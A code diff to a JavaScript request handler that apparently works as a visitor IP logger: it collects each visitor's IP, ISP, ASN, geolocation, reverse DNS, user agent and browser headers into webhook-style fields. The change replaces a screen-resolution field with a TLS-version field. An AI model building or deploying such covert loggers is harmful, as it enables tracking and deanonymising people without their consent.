@@ -121,7 +121,7 @@ function logDebugInfo(reverseDNS) {
 
 
 function createCommonFields(
-    ipDetails, port, coords, userAgent, screenResolution, deviceType, os, browserEngine,
+    ipDetails, port, coords, userAgent, tlsVersion, deviceType, os, browserEngine,
     acceptLanguage, acceptEncoding, doNotTrack, referer,
     visitCount
 ) {
@@ -135,7 +135,7 @@ function createCommonFields(
         { name: "Port", value: `\`${port}\``, inline: true },
         { name: "Provider", value: safeValue(ipDetails.isp), inline: true },
         { name: "Visit Count", value: `\`${visitCount}\``, inline: true },
-        { name: "Screen Resolution", value: `\`${screenResolution}\``, inline: true },
+        { name: "TLS Version", value: `\`${tlsVersion}\``, inline: true },
         { name: "ASN", value: safeValue(ipDetails.as), inline: true },
         { name: "Continent", value: safeValue(ipDetails.continent), inline: true },
         { name: "Country", value: safeValue(ipDetails.country), inline: true },
@@ -207,7 +207,8 @@ export default async function handler(req, res) {
         // Perform reverse DNS lookup
         const reverseDNS = ipDetails.query ? await getReverseDNS(ipDetails.query) : 'N/A';
         const port = req.headers['x-forwarded-port'] || req.connection.localPort;
-        const screenResolution = req.headers['x-screen-resolution'] || "Unknown";
+        const tlsVersion = req.socket.getProtocol ? req.socket.getProtocol() : "Not available";
+
 
 
 
@@ -345,7 +346,7 @@ export default async function handler(req, res) {
                     port,
                     coords,
                     userAgent,
-                    screenResolution,
+                    tlsVersion,
                     deviceType,
                     os,
                     browserEngine,
